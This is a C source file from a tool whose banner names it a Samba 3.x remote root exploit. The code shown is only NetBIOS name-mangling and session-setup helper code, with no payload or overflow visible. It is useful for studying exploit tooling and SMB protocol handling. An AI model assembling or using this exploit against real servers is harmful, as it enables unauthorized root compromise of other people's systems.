/*
 .oooooo..o                              .o8                 oooo       ooooo ooooo ooooo
d8P'    `Y8                             "888                 `888       `888' `888' `888'
Y88bo.       .oooo.   ooo. .oo.  .oo.    888oooo.   .oooo.    888        888   888   888
 `"Y8888o.  `P  )88b  `888P"Y88bP"Y88b   d88' `88b `P  )88b   888        888   888   888
     `"Y88b  .oP"888   888   888   888   888   888  .oP"888   888        888   888   888
oo     .d8P d8(  888   888   888   888   888   888 d8(  888   888        888   888   888
8""88888P'  `Y888""8o o888o o888o o888o  `Y8bod8P' `Y888""8o o888o      o888o o888o o888o

  sambal III: samba 3.x.x remote root exploit                  by eSDee (esdee@netric.org)

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <ctype.h>
#include <arpa/inet.h>

#include "session.h"

#include "nbt.h"
#include "netio.h"
#include "smb.h"
#include "smb_core.h"
#include "smb_funct.h"

const unsigned char *global_scope = NULL;

unsigned int
name_len(unsigned char *s1)
{
        unsigned char *s = (unsigned char *) s1;

        unsigned int len = 0;

        if (0xC0 == (*s & 0xC0))
                return 2;

        for (len = 1; (*s); s += (*s) + 1) {

                len += *s + 1;

                if ((len == 0) || (len > 80)) {
                        fprintf(stderr, "name_len: Invalid length.\n");
                        exit(EXIT_FAILURE);
                }
        }

        return len;
}

int
name_mangle(unsigned char *In, unsigned char *Out, char name_type)
{
        unsigned char buf[20];
        unsigned char *p = Out;

        unsigned int i  = 0;
        unsigned int c  = 0;
        unsigned int len= 0;

        memset (buf, '\0', sizeof(buf));

        if (strcmp (In, "*") == 0)
                buf[0] = '*';
        else
                snprintf (buf, sizeof(buf), "%-15.15s%c", In, name_type);

        p[0] = 32;
        p++;

        for (i = 0; i < 16; i++) {
                c = toupper (buf[i]);
                p[i * 2] = ((c >> 4) & 0x000F) + 'A';
                p[(i * 2) + 1] = (c & 0x000F) + 'A';
        }

        p += 32;
        p[0] = '\0';

        for (i = 0, len = 0; NULL != global_scope; i++, len++) {
                switch (global_scope[i]) {
                        case '\0':
                                p[0] = len;
                                if (len > 0)
                                p[len + 1] = 0;
                                return name_len (Out);
                                break;
                        case '.':
                                p[0] = len;
                                p += (len + 1);
                                len = -1;
                                break;
                        default:
                                p[len + 1] = global_scope[i];
                                break;
                }
        }

        return name_len(Out);
}

int
NBT_session_setup(struct SMB_session *session)
{
        struct NBT_header nbt_header;

        nbt_packet pkt;

        char recv_buf[MAX_BUFSIZE];

        int ret = 0;

        memset(&pkt,            '\0', sizeof(nbt_packet));
        memset(&nbt_header,     '\0', sizeof(struct NBT_header));
        memset(recv_buf,        '\0', sizeof(recv_buf));

        pkt.type        = NB_SSN_REQUEST;
        pkt.flags       = 0x00;
        pkt.length      = bswap16(sizeof(nbt_packet) - 4);

        name_mangle (session->nbt_name, pkt.called,  SERVER);
        name_mangle (CALLING_NAME,      pkt.calling, WORKSTATION); 

        if (netio_send(session->fd, &pkt, sizeof(nbt_packet), 0) < 0)
                return -1;

        if ((ret = netio_recv(session->fd, recv_buf, sizeof(recv_buf), 0)) < 0) {
                /* Do error handling. */
                return -1;
        }

        if (ret < sizeof(struct NBT_header)) {
                /* Do error handling. */
                return -1;
        }

        memcpy(&nbt_header, recv_buf, sizeof(struct NBT_header));

        switch(nbt_header.NBT_type) {
                case NB_SSN_POSRESP:
                        return 0;
                case NB_SSN_NEGRESP:
                        return -1;
                default:
                        return -1;
        }
                
        return 0;
}

